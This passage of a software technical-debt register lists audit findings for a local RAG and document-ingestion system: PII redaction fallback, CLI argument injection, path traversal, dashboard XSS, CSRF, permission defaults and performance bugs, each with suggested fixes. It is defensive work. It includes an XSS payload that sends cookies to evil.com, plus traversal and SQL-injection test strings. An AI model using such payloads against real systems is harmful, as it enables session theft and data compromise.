  3. Single-item commit: Use `threading.Thread` (matching bulk path) or `asyncio.to_thread`
- **Effort:** ~6 functions across 3 files. Each is a small wrapper change (~3 lines per function).
- **Trigger:** P9 Wave 2. Must test with Claude Desktop MCP after applying.

### TD-025: PII Redaction Silent Fallback to Unredacted Text

- **Severity:** Critical
- **Category:** Data Protection
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/executor.py:88-92`
- **Description:** The `_redact_pii()` function catches all exceptions and returns the **original unredacted text** as a fallback:
  ```python
  # Current code (UNSAFE):
  except Exception as e:
      logger.error(f"PII redaction failed: {e}")
      return original_text  # Raw PII flows to vault + RAG
  ```
  If Presidio's `AnalyzerEngine` or spaCy's `en_core_web_lg` model fails (OOM, model load error, corrupt cache), the function silently returns unredacted text containing SSNs, bank account numbers, names, and other PII. This text then flows into the Obsidian vault (`VAULT_PATH/Ingested/`), the main RAG LanceDB (searchable by any agent with `search_main` permission), and the archive retains originals regardless but the redacted paths are supposed to be safe.
- **Impact:** Data protection failure for documents marked `is_sensitive=True`. The entire PII redaction pipeline becomes a no-op on any Presidio/spaCy error, with no user notification.
- **Suggested Fix:** Raise `ProcessingError` on redaction failure:
  ```python
  except Exception as e:
      logger.error(f"PII redaction failed for {file_name}: {e}", exc_info=True)
      raise ProcessingError(f"PII redaction failed for {file_name}: {e}") from e
  ```
  The calling code in `execute_approved_item()` already catches `ProcessingError` and sets the staging item status to `"error"`. The user sees the error in the dashboard and can retry after fixing the underlying issue.
- **Effort:** 3-line change. Add 1 test verifying raise behavior.
- **Trigger:** P9 Wave 1.

### TD-026: Gemini CLI Prompt Injection via -p Argument

- **Severity:** Critical
- **Category:** Security / Injection
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/llm/provider.py:403-416`
- **Description:** `GeminiCliProvider.generate()` passes the combined system+user prompt directly as the `-p` CLI argument:
  ```python
  combined_prompt = f"{system_prompt}\n\n{user_prompt}"
  args = [self._cli_path, "-p", combined_prompt, "--output-format", "json", ...]
  process = await asyncio.create_subprocess_exec(*args, ...)
  ```
  While `create_subprocess_exec` avoids shell injection (no shell expansion), the prompt is a positional argument containing thousands of characters of untrusted document text (OCR output, extracted PDF content). A crafted document could contain text resembling CLI flags (e.g., `--sandbox`, `--yolo`). **Contrast with ClaudeCliProvider** (same file, lines 308-340) which correctly receives the prompt via stdin using `process.communicate(input=prompt.encode())`. **Also applies to CodexCliProvider** (lines 465-490) which uses the same `-p` pattern.
- **Impact:** Argument injection risk on every Gemini CLI and Codex CLI LLM call. The `user_prompt` contains raw document content from the inbox.
- **Suggested Fix:** Pass prompt via stdin (matching ClaudeCliProvider pattern):
  ```python
  args = [self._cli_path, "--output-format", "json", "-m", self._cli_model]
  process = await asyncio.create_subprocess_exec(
      *args, stdin=asyncio.subprocess.PIPE,
      stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
  )
  stdout, stderr = await process.communicate(input=combined_prompt.encode())
  ```
  If CLI does not accept stdin, use `tempfile.NamedTemporaryFile` and pass the file path.
- **Effort:** ~15 lines changed across 2 provider classes. Test with a document containing `--` characters.
- **Trigger:** P9 Wave 1.

### TD-027: Cold Storage Path Traversal (Unvalidated Destination)

- **Severity:** Critical
- **Category:** Security / Path Traversal
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/api/dashboard_routes.py:341-354`, `src/catalog/catalog_manager.py:629-657`
- **Description:** The `/api/catalog/cold-storage` dashboard endpoint accepts `destination_root` from the POST body with no validation and passes it directly to `shutil.move()`:
  ```python
  # dashboard_routes.py (line 341):
  destination = data.get("destination_root", "")
  return catalog.migrate_to_cold(doc_ids, device_name, destination)

  # catalog_manager.py (line 635):
  dest_base = Path(destination_root) / "PKM"
  dest_path = dest_base / rel
  dest_path.parent.mkdir(parents=True, exist_ok=True)  # Creates arbitrary dirs
  shutil.move(str(src_path), str(dest_path))            # Moves files anywhere
  ```
  A caller could supply `destination_root=/` or `destination_root=~/.ssh/` to move archived files (including PII documents) to arbitrary locations. `makedirs(parents=True)` creates any missing directories. The dashboard runs in open mode for localhost — any process or browser tab can call this.
- **Impact:** Arbitrary file move from any localhost caller. Can move PII-containing archives to world-readable locations.
- **Suggested Fix:** Add path validation before calling `migrate_to_cold()`:
  ```python
  dest = Path(destination_root).resolve()
  allowed_roots = [Path("/Volumes"), Path.home() / "Documents"]
  if not any(dest.is_relative_to(root) for root in allowed_roots):
      return JSONResponse(status_code=400, content={"error": "Destination must be under /Volumes/ or ~/Documents"})
  if ".." in dest.parts:
      return JSONResponse(status_code=400, content={"error": "Path traversal not allowed"})
  if not dest.exists() or not dest.is_dir():
      return JSONResponse(status_code=400, content={"error": "Destination must be an existing directory"})
  ```
- **Effort:** ~10 lines of validation. Add tests with traversal payloads (`../../../etc`, `/tmp`).
- **Trigger:** P9 Wave 1.

### TD-028: Dashboard XSS (innerHTML Without Escaping)

- **Severity:** High
- **Category:** Security / XSS
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/ui/templates/dashboard.html:1447,1837-1848,1889-1903,1911-1918`
- **Description:** Multiple dashboard panels inject server-returned data into `innerHTML` without HTML escaping, allowing stored XSS from document content, memory facts, or tag values:
  1. **RAG Browser** (line 1840-1842): `${f.source_path}` and `${f.preview}` — document filenames and content previews from LanceDB
  2. **Memory panel** (line 1892): `${f.content}` and `${f.source}` — user fact content from episodic memory
  3. **Corrections panel** (line 1913): `${field}`, `${diff.ai}`, `${diff.human}` — AI proposal corrections
  4. **Tag pills** (line 1447): `${tag}` injected into both `innerHTML` display and an `onclick` handler attribute — a tag containing `'` breaks the attribute quoting
  **Note:** The chat panel (lines 1968-1972) correctly escapes content before markdown rendering — these other panels do not follow the same pattern.
- **Impact:** A document with `<img src=x onerror="fetch('http://evil.com/'+document.cookie)">` in its filename or content would run JS when viewed in the RAG browser. Since the dashboard has full API access (including restricted RAG), XSS could exfiltrate PII data.
- **Suggested Fix:** Add shared `escapeHtml()` function and apply to all user-data injection sites:
  ```javascript
  function escapeHtml(str) {
      if (!str) return '';
      const div = document.createElement('div');
      div.textContent = str;
      return div.innerHTML;
  }
  // Then: ${escapeHtml(f.source_path)} instead of ${f.source_path}
  ```
  For tag pills, use `textContent` for display and properly escape `onclick` arguments.
- **Effort:** Add 1 function, update ~12 template string injection sites. ~30 lines changed.
- **Trigger:** P9 Wave 1.

### TD-029: /api/v1/vaults Unauthenticated Filesystem Path Exposure

- **Severity:** High
- **Category:** Security / Information Disclosure
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/api/v1_routes.py:978-986`
- **Description:** The `/api/v1/vaults` endpoint has no `Depends(check_permissions)` guard:
  ```python
  @router.get("/vaults")
  async def list_vaults():
      return {"vaults": {
          name: {"path": str(path), "exists": path.exists()}
          for name, path in VAULT_PATHS.items()
      }}
  ```
  Returns absolute filesystem paths to Obsidian vaults — including the user's home directory path — to any caller without authentication. `VAULT_PATHS` is populated from `.env`. The `/api/v1/manifest` endpoint is intentionally public (capability discovery), but vault paths are personal configuration data.
- **Impact:** Information disclosure (home directory structure, vault location) to any unauthenticated HTTP caller.
- **Suggested Fix:** Add `permissions: dict[str, bool] = Depends(check_permissions)` to the endpoint. Require `catalog_read` permission.
- **Effort:** 1-line change. Add test verifying 401 without auth.
- **Trigger:** P9 Wave 1.

### TD-030: SQL Injection-Prone F-String in KG Schema Migration

- **Severity:** High
- **Category:** Security / SQL Injection
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/graph/knowledge_graph.py:296-317`
- **Description:** `_migrate_schema()` constructs DDL and DML statements with f-string column interpolation:
  ```python
  cursor.execute(f"ALTER TABLE entities ADD COLUMN {col} {col_type} DEFAULT {default}")
  cursor.execute(f"UPDATE entities SET {col} = created_at WHERE {col} = ''")
  ```
  The `col`, `col_type`, `default` values come from hardcoded tuple literals (lines 289-294, 306-310) so they are **not attacker-controlled** currently. However, the project's own `CLAUDE.md` calls out f-string SQL as a pattern to avoid, and `build_eq_clause()` and `safe_identifier()` in `src/utils/query_sanitize.py` exist for exactly this purpose. If this pattern is copied when adding new migration columns, it becomes a live SQL injection.
- **Impact:** Low immediate risk (hardcoded inputs). High regression risk if pattern is copied to dynamic values.
- **Suggested Fix:** Validate identifiers before interpolation (SQLite does not support `?` for DDL identifiers):
  ```python
  from src.utils.query_sanitize import safe_identifier
  col_safe = safe_identifier(col)
  type_safe = safe_identifier(col_type)
  cursor.execute(f"ALTER TABLE entities ADD COLUMN {col_safe} {type_safe} DEFAULT ?", (default,))
  ```
- **Effort:** ~6 lines changed. No new tests needed (migration runs once at startup).
- **Trigger:** P9 Wave 1.

### TD-031: LanceDB Connection/Table Opened Per Request

- **Severity:** High
- **Category:** Performance
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/api/v1_routes.py:73,245,774,860,933`, `src/search/hybrid_search.py:240`
- **Description:** Two related performance issues with LanceDB connection management:
  1. **API routes bypass shared connection:** The `lifespan` handler in `server.py` correctly creates `db = lancedb.connect(DB_PATH)` at startup and stores it in `app.state.db`. However, 5 API endpoints (`api_stats`, `api_delete_document`, `api_get_document`, `api_bulk_delete`, `api_manifest`) call `lancedb.connect()` directly — they never use `app.state.db`. Each `connect()` call opens file handles, reads the LanceDB manifest, and re-initializes the URI registry.
  2. **`_search_single()` bypasses table cache:** `HybridSearcher` has a lazy-caching `table` property (lines 100-104) that caches the main-DB table after first open. But `_search_single()` calls `db.open_table(self.table_name)` directly (line 240), bypassing this cache every time. For the restricted-DB path, there is no cache at all.
- **Impact:** With 7,329 chunks and 553 parent chunks, each redundant `connect()` or `open_table()` reads manifest and table metadata from disk. The `/manifest` endpoint (called on every MCP handshake from Claude Desktop) is the most frequently affected.
- **Suggested Fix:**
  1. All API routes: `db = getattr(request.app.state, "db", None) or lancedb.connect(DB_PATH)`
  2. `_search_single()`: Use `self.table` for main DB; add `_restricted_table` cached property for restricted DB
- **Effort:** ~20 lines changed across 2 files.
- **Trigger:** P9 Wave 2.

### TD-032: Tag Update Rewrites All Vectors (Read-Delete-Reinsert)

- **Severity:** High
- **Category:** Performance
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/api/dashboard_routes.py:804-810`
- **Description:** `update_document_tags` modifies tags via a full read-delete-reinsert cycle:
  ```python
  # Current code (SLOW — reads all vectors just to change a text field):
  rows = tbl.search().where(doc_filter).limit(10000).to_list()
  if rows:
      for row in rows:
          row["tags"] = tags_str
      tbl.delete(doc_filter)
      tbl.add(rows)
  ```
  For a document with 100 child chunks at 1024d float32 vectors (4KB each), this reads ~400KB of vector data into memory, deletes all 100 rows, then rewrites all 100 rows — just to change a text field.
- **Impact:** Unnecessary memory allocation and disk I/O on every tag update. For large documents (500+ chunks), this takes several seconds.
- **Suggested Fix:** Use LanceDB's native `update()` method (verify availability in installed version >= 0.6.0):
  ```python
  # Fixed (one line):
  tbl.update(where=doc_filter, values={"tags": tags_str})
  ```
- **Effort:** 1-line fix (replace 5 lines with 1).
- **Trigger:** P9 Wave 2.

### TD-033: Embedding Model Loaded Per Document Commit

- **Severity:** High
- **Category:** Performance
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/executor.py:109,272`, `src/server.py:101`
- **Description:** `_index_in_rag()` calls `create_embedding_service()` (a factory that always instantiates a **new** `EmbeddingService`) instead of `get_embedding_service()` (the singleton getter). Each instantiation loads the BGE-M3 model (~1.5GB ONNX weights) from disk.
  ```python
  # Current (SLOW — loads model from disk every time):
  from src.embeddings.embedding_service import create_embedding_service
  embedder = create_embedding_service()  # Line 109 (main RAG)
  embedder = create_embedding_service()  # Line 272 (restricted RAG)
  ```
  For a batch commit of 10 documents, this loads ~1.5GB 10-20 times. The server lifespan also calls `create_embedding_service()` (line 101), so during dashboard commits (same process), there are at least 2 copies of BGE-M3 in memory.
- **Impact:** ~1.5GB model loaded from disk per document commit. Massive memory churn. Contributes to hitting the 92% RAM pause threshold during batch ingestion.
- **Suggested Fix:** One-word change at both call sites:
  ```python
  from src.embeddings.embedding_service import get_embedding_service
  embedder = get_embedding_service()  # Uses singleton — loaded once
  ```
- **Effort:** 2-line change (1 import + 1 call, repeated for restricted path).
- **Trigger:** P9 Wave 2.

### TD-034: Full Table Scans for Document Counts

- **Severity:** High
- **Category:** Performance
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/api/v1_routes.py:78-79,249-250,884-887`
- **Description:** Three API endpoints load excessive data from LanceDB to get simple counts:
  1. **`/api/v1/manifest`** (line 78) and **`/api/v1/stats`** (line 249): Call `pt.to_arrow()` with no column selection, loading the entire `parent_chunks` table (553 rows with full text content) into memory just to count unique `source_path` values:
     ```python
     sources = pt.to_arrow().column("source_path").to_pylist()
     documents = len(set(sources))
     ```
  2. **`/api/v1/documents/{id}`** (line 884): Loads up to 10,000 child chunks including 1024d float32 vectors (4KB each) just to count them:
     ```python
     children = ct.search().where(doc_filter).limit(10000).to_list()
     child_count = len(children)
     ```
  The `/manifest` endpoint is called on every MCP handshake from Claude Desktop, making it the most frequently affected.
- **Impact:** Megabytes of data read from disk per request. For 553 parents, `to_arrow()` loads all text content (~50-200KB per chunk).
- **Suggested Fix:**
  ```python
  # Stats/manifest — column projection:
  sources = pt.to_arrow(columns=["source_path"]).column("source_path").to_pylist()

  # Get document — use count_rows:
  child_count = ct.count_rows(doc_filter)
  ```
- **Effort:** 3 one-line changes.
- **Trigger:** P9 Wave 2.

### TD-035: N SQLite Open/Close Per Entity in Knowledge Graph

- **Severity:** High
- **Category:** Performance
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/graph/knowledge_graph.py:330,383,415-420`, `src/catalog/catalog_manager.py`
- **Description:** `add_from_extraction()` loops over entities and relationships, calling `add_entity()` and `add_relationship()` for each. Each method independently opens a SQLite connection (`sqlite3.connect(self.db_path)`), performs one operation, calls `conn.commit()`, and closes. For a document producing 5 entities and 5 relationships = 10 separate open/commit/close cycles.
  Same pattern in `CatalogManager`: `execute_approved_item` calls `catalog.register()` + up to 4x `catalog.record_export()` = 5 separate SQLite open/close calls per committed document.
  Related to TD-017 (SQLite connection leak in read methods — connections not guaranteed to close on exception).
- **Impact:** Unnecessary filesystem I/O during ingestion. Each `sqlite3.connect()` opens file handles, reads the WAL, and acquires locks.
- **Suggested Fix:** Refactor `add_from_extraction()` to use a single connection:
  ```python
  def add_from_extraction(self, entities, relationships):
      with sqlite3.connect(self.db_path) as conn:
          conn.row_factory = sqlite3.Row
          for entity in entities:
              self._add_entity_conn(conn, entity)
          for rel in relationships:
              self._add_relationship_conn(conn, rel)
          conn.commit()
  ```
  Create `_add_entity_conn(conn, entity)` and `_add_relationship_conn(conn, rel)` as internal methods. Apply same pattern to `CatalogManager` commit sequence.
- **Effort:** ~30 lines in `knowledge_graph.py`, ~15 lines in `catalog_manager.py`. Refactoring only — no logic changes.
- **Trigger:** P9 Wave 2.

### TD-036: Security-Critical Modules Have Zero Test Coverage

- **Severity:** High
- **Category:** Test Coverage
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/utils/path_validation.py`, `src/utils/query_sanitize.py`, `src/utils/secure_file.py`
- **Description:** Three modules that enforce security boundaries have zero dedicated test files:
  1. **`path_validation.py`** — Prevents path traversal attacks on file operations. Used by `executor.py` (archiving), `exporter.py` (vault export), `catalog_manager.py` (cold storage). No tests verify it blocks `../../../etc/passwd`, URL-encoded `..%2f`, symlink chains, null bytes, or Unicode normalization attacks.
  2. **`query_sanitize.py`** — Prevents SQL injection in LanceDB filter strings. Provides `build_eq_clause()` (used in all LanceDB delete/filter operations) and `safe_identifier()` (used for DDL). No tests verify handling of `'; DROP TABLE --`, `" OR 1=1`, Unicode confusables.
  3. **`secure_file.py`** — Enforces file permissions (0o600 for data, 0o700 for dirs). Used by `settings_manager.py` (settings.yaml), backup system, PII dictionary. No tests verify correct permission setting, umask interaction, or error handling.
  These modules are called on every document ingest, search query, and settings change. Correctness is only verified implicitly through higher-level integration tests.
- **Impact:** If any module has a bug (e.g., `build_eq_clause()` failing to escape a quote character), the vulnerability would not be caught by the test suite.
- **Suggested Fix:** Create 3 test files:
  - `tests/test_path_validation.py` (~20 tests): Traversal attacks, symlinks, null bytes, valid paths
  - `tests/test_query_sanitize.py` (~15 tests): Injection payloads, edge cases, special characters
  - `tests/test_secure_file.py` (~10 tests): Permission creation, verification, error handling
- **Effort:** ~45 new tests across 3 files. ~300 lines of test code.
- **Trigger:** P9 Wave 3.

### TD-037: settings_routes.py + ingest_service.py Untested

- **Severity:** High
- **Category:** Test Coverage
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/api/settings_routes.py` (~320 lines, 10 endpoints), `src/ingest_service.py` (~250 lines)
- **Description:** Two production-critical modules have zero test coverage:
  1. **`settings_routes.py`** — 10 FastAPI endpoints: GET/POST agents, POST new agent, DELETE agent, PUT permissions, PUT LLM provider, GET/POST search scopes, and more. All routes carry `# type: ignore[no-untyped-def]` (no return type annotations). These endpoints control who can access the restricted PII database — untested auth boundaries are a security risk.
  2. **`ingest_service.py`** — The unified ingestion pipeline (TD-008 resolution). Handles content-hash deduplication, parent-child chunking, embedding generation, LanceDB table creation, quality scoring. This is the code path for every `/api/v1/ingest` call.
- **Impact:** Agent permission changes (including granting restricted DB access) and API ingestion are completely untested.
- **Suggested Fix:**
  - `tests/test_settings_routes.py` (~50 tests): Agent CRUD lifecycle, permission validation (reject invalid names), API key uniqueness, auth requirements (dashboard-only), LLM provider validation, error responses
  - `tests/test_ingest_service.py` (~30 tests): Content hash dedup (unchanged vs changed), parent-child hierarchy, embedding generation (mock BGE-M3), table creation, quality scoring, error handling
- **Effort:** ~80 new tests across 2 files. ~600 lines of test code.
- **Trigger:** P9 Wave 3.

### TD-038: file_size Always 0 in Catalog

- **Severity:** High
- **Category:** Bug
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/executor.py:379-383`
- **Description:** The catalog registration in `execute_approved_item()` calls `original_path.stat().st_size` to record file size. But by this point, `archive_to_target()` (line ~300) has already moved the file:
  ```python
  # Line ~300: file is MOVED here
  archive_to_target(current_path, target_folder)
  # ...80 lines of other processing...
  # Line ~381: file no longer exists at original_path
  file_size = original_path.stat().st_size if original_path.exists() else 0  # Always 0
  ```
  Since the original file no longer exists at `original_path`, `exists()` returns `False` and `file_size` defaults to 0.
- **Impact:** All 102 catalog entries have `file_size=0`. Catalog storage statistics and cold storage migration size estimates are wrong.
- **Suggested Fix:** Capture file size before archiving:
  ```python
  # Before archive_to_target():
  try:
      file_size = current_path.stat().st_size
  except OSError:
      file_size = 0
  archive_to_target(current_path, target_folder)
  # ... later, use pre-captured file_size in catalog.register()
  ```
  After fixing, run `scripts/rebuild_catalog.py` to backfill correct sizes for existing 102 entries (if script reads sizes from archive copies).
- **Effort:** 4-line change (move stat before archive). Backfill existing catalog entries.
- **Trigger:** P9 Wave 2.

### TD-039: ResultCache Not Thread-Safe

- **Severity:** Medium
- **Category:** Concurrency
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/search/hybrid_search.py:20-58`
- **Description:** `_ResultCache` uses a plain `dict` with no locking. `HybridSearcher` is a shared singleton (initialized in `lifespan`, stored on `app.state`). Multiple concurrent FastAPI requests call `search()` simultaneously. The `put()` method performs a multi-step read-then-write: checks `len(self._cache) >= self._max_size`, deletes the oldest key, then inserts. Two concurrent `put()` calls could both see `len >= max_size` and both delete the same oldest key, or a `get()` could find a key and have it deleted before value access.
- **Impact:** Potential cache corruption under concurrent load — may return stale/wrong results or raise `KeyError`.
- **Suggested Fix:**
  ```python
  import threading
  class _ResultCache:
      def __init__(self, max_size, ttl_seconds):
          ...
          self._lock = threading.Lock()
      def get(self, key):
          with self._lock:
              ...
      def put(self, key, results):
          with self._lock:
              ...
  ```
- **Effort:** ~6 lines added.
- **Trigger:** P9 Wave 2.

### TD-040: catalog_search Ignores Tags When Query Provided

- **Severity:** Medium
- **Category:** Bug
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/mcp_server/server.py:1092-1098`
- **Description:** In the MCP `catalog_search` tool, the filter construction has a bug:
  ```python
  filters: dict = {}
  if tags:
      filters["tag"] = tags.split(",")[0].strip()  # Takes ONLY first tag
  if sensitive_only:
      filters["is_sensitive"] = True
  if query:
      filters["tag"] = query  # OVERWRITES the tags filter!
  ```
  When both `query` and `tags` are provided, `tags` is silently discarded. Also, `tags.split(",")[0]` only uses the first tag — `tags="sphr-study,cert-prep"` drops `cert-prep`.
- **Impact:** MCP `catalog_search` tag filtering is broken when combined with query. Multi-tag search is silently limited to first tag only.
- **Suggested Fix:** Use separate filter keys and support multiple tags:
  ```python
  if tags:
      filters["tags"] = [t.strip() for t in tags.split(",")]
  if query:
      filters["query"] = query  # Don't overwrite tags
  ```
  Update `CatalogManager.search()` to handle both filter types independently.
- **Effort:** ~10 lines in MCP tool, ~5 lines in CatalogManager. Add test with both params.
- **Trigger:** P9 Wave 2.

### TD-041: No CSRF Protection on Dashboard Endpoints

- **Severity:** Medium
- **Category:** Security
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/api/dashboard_routes.py` (all POST/DELETE routes), `src/server.py`
- **Description:** All dashboard mutation endpoints (`/api/start-batch`, `/api/commit-all`, `/api/approve/{item_id}`, `/api/catalog/cold-storage`, `/api/memory/add-fact`, etc.) accept POST requests with no CSRF token or origin validation. Since the dashboard runs on `localhost:8000` and is accessed from a browser, a malicious website the user visits could make cross-origin requests and trigger file commits, archiving, and RAG indexing.
  This is a known localhost attack vector: DNS rebinding allows a remote attacker to resolve their domain to `127.0.0.1`, bypassing same-origin policy. Combined with TD-042 (open mode grants all permissions), this gives a remote attacker full access to CoreRag including the restricted PII database.
- **Impact:** Remote attackers can trigger file processing, document commits, and PII database searches via CSRF/DNS rebinding.
- **Suggested Fix:** Add lightweight CSRF middleware validating `Origin` header:
  ```python
  @app.middleware("http")
  async def csrf_origin_check(request: Request, call_next):
      if request.method in ("POST", "PUT", "DELETE"):
          origin = request.headers.get("origin", "")
          if origin and not origin.startswith(("http://localhost", "http://127.0.0.1")):
              return JSONResponse(status_code=403, content={"error": "CSRF check failed"})
      return await call_next(request)
  ```
  Requests without `Origin` header (curl, API clients) pass through — they don't come from browsers.
- **Effort:** ~10 lines of middleware in `server.py`.
- **Trigger:** P9 Wave 1.

### TD-042: Legacy Key + Open Mode Grant search_restricted

- **Severity:** Medium
- **Category:** Security / Permissions
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/settings/settings_manager.py:304-319`, `src/server.py:162-171`
- **Description:** Two permission escalation paths expose the restricted PII database without explicit user opt-in:
  1. **Legacy key migration** (`settings_manager.py:304-319`): When `CORERAG_API_KEY` is in the environment, `_migrate_legacy_key()` silently creates a `_legacy` agent with ALL permissions including `search_restricted: True`. Runs on startup with only `INFO` log. Any consumer from the old single-key model gets automatic access to unredacted PII (SSNs, bank accounts, medical records).
  2. **Open mode** (`server.py:162-171`): When no external agents are configured, `check_permissions()` returns `{perm: True for perm in DEFAULT_PERMISSIONS}` — granting `search_restricted: True` to all unauthenticated callers. The `_mcp` factory default correctly has `search_restricted: False`, but open mode ignores factory defaults.
  Combined with TD-041 (CSRF), a remote attacker could search the restricted database via DNS rebinding.
- **Impact:** Unredacted PII database accessible by default with no explicit user opt-in.
- **Suggested Fix:**
  1. `_migrate_legacy_key()`: Set `search_restricted: False`. Log at WARNING level with instructions to review via Settings tab.
  2. `check_permissions()` open mode: `perms["search_restricted"] = False`
- **Effort:** 3-line change across 2 files.
- **Trigger:** P9 Wave 1.

### TD-043: API Error Messages Leak Internal Exception Details

- **Severity:** Medium
- **Category:** Security / Information Disclosure
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/api/v1_routes.py` (lines 446, 581, 733, 817, 904), `src/api/settings_routes.py` (lines 62, 190, 293)
- **Description:** All generic exception handlers return `str(e)` directly in the JSON response body:
  ```python
  except Exception as e:
      logger.error(f"Search API failed: {e}", exc_info=True)
      return JSONResponse(status_code=500, content={"error": str(e), "results": [], ...})
  ```
  Python exception messages commonly include file paths (`/Users/tjneary/.corerag/lancedb/child_chunks.lance`), class names (`lancedb.table.LanceTable`), database schema details, and internal stack context. For an API designed for external AI agents (Kendra, Centaur), this is information disclosure.
- **Impact:** Internal implementation details (paths, schema, class names) exposed to API callers on every unhandled error.
- **Suggested Fix:** Return generic messages for unhandled exceptions, keep details for `CoreRagError` subclasses:
  ```python
  except CoreRagError as e:
      return JSONResponse(status_code=400, content={"error": str(e)})
  except Exception as e:
      logger.error(f"API failed: {e}", exc_info=True)
      return JSONResponse(status_code=500, content={"error": "Internal server error"})
  ```
- **Effort:** ~15 exception handlers across 2 files. Pattern replacement.
- **Trigger:** P9 Wave 1.

### TD-044: LRU Cache O(n) List Operations

- **Severity:** Medium
- **Category:** Performance
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/embeddings/embedding_service.py:112`
- **Description:** `EmbeddingCache` tracks access order using a plain Python `list`:
  - `self._access_order.remove(key)` — called on every cache hit. `list.remove()` is O(n), scanning up to 10,000 entries.
  - `self._access_order.pop(0)` — called on eviction. `list.pop(0)` shifts all remaining elements left, also O(n).
  With `max_size=10000`, each cache operation scans up to 10,000 string entries.
- **Impact:** O(10000) operation per embedding cache hit. Adds measurable overhead for search-heavy workloads.
- **Suggested Fix:** Replace with `collections.OrderedDict` for O(1) LRU:
  ```python
  from collections import OrderedDict
  class EmbeddingCache:
      def __init__(self, max_size=10000):
          self._cache = OrderedDict()
          self._max_size = max_size
      def get(self, key):
          if key in self._cache:
              self._cache.move_to_end(key)  # O(1)
              return self._cache[key]
          return None
      def put(self, key, value):
          if key in self._cache:
              self._cache.move_to_end(key)
          self._cache[key] = value
          if len(self._cache) > self._max_size:
              self._cache.popitem(last=False)  # O(1)
  ```
- **Effort:** ~20 lines refactored. Update cache persistence if it relies on the separate `_access_order` list.
- **Trigger:** P9 Wave 2.

### TD-045: Commit Pause/Stop Race Condition

- **Severity:** Medium
- **Category:** Concurrency
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/api/dashboard_routes.py:60-61,92,138`
- **Description:** Module-level bool globals `_commit_pause_requested` and `_commit_stop_requested` are used for cross-thread signaling between the FastAPI event loop (writes under `_commit_lock`) and the background commit thread (reads outside the lock, line 138). This creates a TOCTOU (time-of-check-time-of-use) issue where state can change between the loop condition check and `time.sleep(1)`, causing up to 1-second delay in responding to stop commands. The inconsistent locking pattern (write under lock, read without lock) could mask subtler bugs.
- **Impact:** Minor — up to 1-second delay in pause/stop response. Not a data integrity issue.
- **Suggested Fix:** Replace bool globals with `threading.Event` objects:
  ```python
  _commit_pause_event = threading.Event()
  _commit_stop_event = threading.Event()
  # Background thread: _commit_pause_event.wait(timeout=1.0)
  # Request handler: _commit_pause_event.set() / .clear()
  ```
  `threading.Event` is designed for cross-thread signaling and is inherently thread-safe.
- **Effort:** ~15 lines changed. Replace bool checks with `.is_set()`, sets with `.set()`/`.clear()`.
- **Trigger:** P9 Wave 2.

### TD-046: Silent Exception Swallowing in Executor

- **Severity:** Medium
- **Category:** Code Quality
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/executor.py:316-322,366-371`
- **Description:** Two exception handlers in `execute_approved_item()` silently swallow errors:
  1. **Version check** (lines 316-322): `vm.is_changed()` wrapped in bare `except Exception` with no logging. If the version store is corrupt or has permissions errors, every document is unconditionally re-indexed (bypassing content-hash deduplication):
     ```python
     try:
         if not vm.is_changed(doc_id, export_text):
             logger.info("Document unchanged, skipping RAG index")
         else:
             _index_in_rag(...)
     except Exception:  # No logging, no exc_info
         _index_in_rag(...)
     ```
  2. **Validation** (lines 366-371): `validate_commit()` wrapped in `except Exception: pass` — if `validate_commit` has an import error or unexpected exception, the failure is completely invisible.
- **Impact:** Version deduplication silently bypassed on version-store errors. Validation failures invisible.
- **Suggested Fix:** Add logging to both:
  ```python
  except Exception as e:
      logger.warning(f"Version check failed for {current_path.name}, re-indexing: {e}")
      _index_in_rag(...)
  ```
- **Effort:** 2-line change per handler (add `as e` and `logger.warning`).
- **Trigger:** P9 Wave 2.

### TD-047: pyproject.toml Missing ~20 Runtime Packages

- **Severity:** Medium
- **Category:** Dependency Health
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `pyproject.toml`, `requirements.txt`
- **Description:** TD-012 was marked resolved (version numbers updated) but `pyproject.toml` `[project.dependencies]` still has only 10 of ~30 runtime packages from `requirements.txt`. Missing: fastapi, uvicorn, jinja2, PyMuPDF, Pillow, presidio-analyzer, spacy, httpx, numpy, anthropic, google-generativeai, rumps, mlx-whisper, opencv-python-headless, FlagEmbedding, etc.
- **Impact:** `pip install corerag-system` produces non-functional installation.
- **Suggested Fix:** Sync `pyproject.toml` dependencies with `requirements.txt` package list.
- **Trigger:** P9 Wave 4.

### TD-048: .env.example + Config Variable Drift

- **Severity:** Medium
- **Category:** Configuration
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `.env.example`, `src/config.py`
